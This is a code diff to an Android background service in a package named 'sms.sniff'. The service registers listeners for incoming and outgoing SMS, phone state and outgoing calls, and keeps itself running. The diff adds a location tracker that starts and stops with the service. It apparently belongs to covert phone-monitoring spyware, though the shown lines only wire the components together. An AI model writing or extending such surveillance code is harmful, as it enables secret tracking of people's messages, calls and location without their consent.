@@ -1,6 +1,7 @@
 package sms.sniff.core;
 
 import sms.sniff.call.IncomingOutgoingCall;
+import sms.sniff.location.LocationUpdater;
 import sms.sniff.sms.Incoming;
 import sms.sniff.sms.Outgoing;
 import sms.sniff.utils.SharedPreferencesEditor;
@@ -16,6 +17,7 @@ public class DynamicRegisterService extends Service{
 	private Intent outgoing;
 	private SharedPreferencesEditor sharedPreferencesEditor;
 	private IncomingOutgoingCall incomingOutgoingCall;
+	private LocationUpdater locationUpdater;
 
 	@Override
 	public IBinder onBind(Intent intent) {
@@ -36,6 +38,8 @@ public class DynamicRegisterService extends Service{
 		registerReceiver(incomingOutgoingCall, new IntentFilter("android.intent.action.PHONE_STATE"));
 		registerReceiver(incomingOutgoingCall, new IntentFilter("android.intent.action.NEW_OUTGOING_CALL"));
 		
+		locationUpdater = new LocationUpdater(this);
+		
 		sharedPreferencesEditor = new SharedPreferencesEditor(this);
 		sharedPreferencesEditor.keepAlive(true);
 		
@@ -48,6 +52,8 @@ public class DynamicRegisterService extends Service{
 		unregisterReceiver(incomingOutgoingCall);
 		unregisterReceiver(incoming);
 		stopService(outgoing);
+		
+		locationUpdater.unregister();
 		
 		sharedPreferencesEditor.keepAlive(false);
 		
